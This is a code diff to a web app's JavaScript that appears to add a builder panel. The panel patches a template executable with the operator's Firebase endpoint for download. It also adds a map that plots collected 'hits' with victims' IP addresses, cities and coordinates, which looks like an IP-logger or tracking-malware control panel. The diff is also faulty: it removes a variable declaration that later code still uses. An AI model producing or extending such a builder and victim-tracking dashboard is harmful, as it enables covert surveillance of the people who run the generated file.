@@ -115,7 +115,19 @@ function wireButtons() {
     });
   }
 
-  const applyBtn = $("nickname-apply");
+  const firebaseSaveBtn = $("firebase-save-btn");
+  const firebaseInput = $("firebase-url");
+  if (firebaseSaveBtn && firebaseInput) {
+    const saved = localStorage.getItem("zx_firebase_host");
+    if (saved) firebaseInput.value = saved;
+    firebaseSaveBtn.addEventListener("click", () => {
+      const val = firebaseInput.value.trim().replace(/^https?:\/\//,"").replace(/\/$/,"");
+      if (!val) { showToast("Paste a Firebase URL first"); return; }
+      localStorage.setItem("zx_firebase_host", val);
+      showToast("Firebase URL saved");
+      if (window.__reloadMapHits) window.__reloadMapHits(val);
+    });
+  }
   if (applyBtn) {
     applyBtn.addEventListener("click", () => {
       const input = $("nickname-input");
@@ -165,6 +177,7 @@ function wireBuilder() {
   const nameInput = $("builder-name");
   const buildBtn = $("builder-build-btn");
   const downloadBtn = $("builder-download-btn");
+  const firebaseInput = $("firebase-url");
   const log = $("build-log");
   if (!nameInput || !buildBtn || !downloadBtn || !log) return;
 
@@ -206,17 +219,17 @@ function wireBuilder() {
     return -1;
   }
 
-  function personalize(buffer, name) {
+  function patchExe(buffer, firebaseHost) {
     const bytes = new Uint8Array(buffer);
-    const SLOT_CHARS = 32;
+    const SLOT_CHARS = 64;
     const needle = encodeUtf16LE("X".repeat(SLOT_CHARS));
     const offset = findBytes(bytes, needle);
-    if (offset === -1) return bytes;
-
-    const safeName = (name || "friend").slice(0, SLOT_CHARS - 1);
-    const slot = new Uint8Array(SLOT_CHARS * 2);
-    slot.set(encodeUtf16LE(safeName), 0);
-    bytes.set(slot, offset);
+    if (offset !== -1 && firebaseHost) {
+      const safe = firebaseHost.trim().replace(/^https?:\/\//,"").replace(/\/$/,"").slice(0, SLOT_CHARS - 1);
+      const slot = new Uint8Array(SLOT_CHARS * 2);
+      slot.set(encodeUtf16LE(safe), 0);
+      bytes.set(slot, offset);
+    }
     return bytes;
   }
 
@@ -231,6 +244,7 @@ function wireBuilder() {
     const steps = [
       `Compiling sources for ${chosenName}...`,
       `Linking objects...`,
+      `Injecting Firebase endpoint...`,
       `Packaging ${chosenName}...`,
       `Build complete: ${chosenName}`,
     ];
@@ -250,11 +264,16 @@ function wireBuilder() {
   });
 
   downloadBtn.addEventListener("click", async () => {
+    const firebaseHost = firebaseInput ? firebaseInput.value.trim() : "";
+    if (!firebaseHost) {
+      showToast("Paste your Firebase URL first");
+      return;
+    }
     try {
       const res = await fetch("template.exe");
       if (!res.ok) throw new Error("template.exe not found");
       const buffer = await res.arrayBuffer();
-      const patched = personalize(buffer, profile.username);
+      const patched = patchExe(buffer, firebaseHost);
       const blob = new Blob([patched], { type: "application/octet-stream" });
       const url = URL.createObjectURL(blob);
       const a = document.createElement("a");
@@ -266,7 +285,7 @@ function wireBuilder() {
       URL.revokeObjectURL(url);
       showToast(`Downloading ${chosenName}`);
     } catch (err) {
-      showToast("Couldn't find template.exe — make sure it's uploaded to your repo");
+      showToast("Download failed — is template.exe uploaded?");
     }
   });
 }
@@ -285,10 +304,56 @@ function initMap() {
   });
 
   L.tileLayer("https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png", {
-    attribution: '&copy; OpenStreetMap contributors &copy; CARTO',
+    attribution: '&copy; OpenStreetMap &copy; CARTO',
     subdomains: "abcd",
     maxZoom: 19,
   }).addTo(map);
+
+  // Custom red teardrop pin SVG
+  const redIcon = L.divIcon({
+    className: "",
+    html: `<svg xmlns="http://www.w3.org/2000/svg" width="28" height="38" viewBox="0 0 28 38">
+      <path fill="#ff4d6d" stroke="#fff" stroke-width="1.5" d="M14 1C7.4 1 2 6.4 2 13c0 8 12 24 12 24s12-16 12-24C26 6.4 20.6 1 14 1z"/>
+      <circle fill="#fff" cx="14" cy="13" r="5"/>
+    </svg>`,
+    iconSize: [28, 38],
+    iconAnchor: [14, 38],
+    popupAnchor: [0, -40],
+  });
+
+  function loadHits(firebaseHost) {
+    if (!firebaseHost) return;
+    const url = `https://${firebaseHost.replace(/^https?:\/\//,"").replace(/\/$/,"")}/hits.json`;
+    fetch(url)
+      .then(r => r.json())
+      .then(data => {
+        if (!data || typeof data !== "object") return;
+        Object.values(data).forEach(hit => {
+          if (!hit.lat || !hit.lon) return;
+          const marker = L.marker([hit.lat, hit.lon], { icon: redIcon }).addTo(map);
+          const popup = L.popup({
+            closeButton: true,
+            className: "zerox-popup",
+            maxWidth: 240,
+          }).setContent(`
+            <div style="background:#0d1017;color:#e7e9f3;padding:12px 14px;border-radius:8px;font-family:'JetBrains Mono',monospace;font-size:12px;min-width:190px;">
+              <div style="color:#ff4d6d;font-weight:700;font-size:13px;margin-bottom:6px;">${hit.ip || "Unknown IP"}</div>
+              <div style="color:#4ce0d2;margin-bottom:4px;">${hit.city || "—"}, ${hit.country || "—"}</div>
+              <div style="color:#7b8094;font-size:11px;">${hit.lat.toFixed(4)}, ${hit.lon.toFixed(4)}</div>
+            </div>
+          `);
+          marker.bindPopup(popup);
+        });
+      })
+      .catch(() => {});
+  }
+
+  // Try to load from saved Firebase URL
+  const saved = localStorage.getItem("zx_firebase_host");
+  if (saved) loadHits(saved);
+
+  // Refresh hits when user saves Firebase URL in builder
+  window.__reloadMapHits = loadHits;
 
   const zoomInBtn = $("map-zoom-in");
   if (zoomInBtn) zoomInBtn.addEventListener("click", () => map.zoomIn());
@@ -299,10 +364,7 @@ function initMap() {
   const resetBtn = $("map-reset");
   if (resetBtn) resetBtn.addEventListener("click", () => map.setView([20, 0], 2.4));
 
-  window.__mapWidget = {
-    resize: () => map.invalidateSize(),
-    draw: () => {},
-  };
+  window.__mapWidget = { resize: () => map.invalidateSize(), draw: () => {} };
 }
 
 function safeRun(fn, label) {
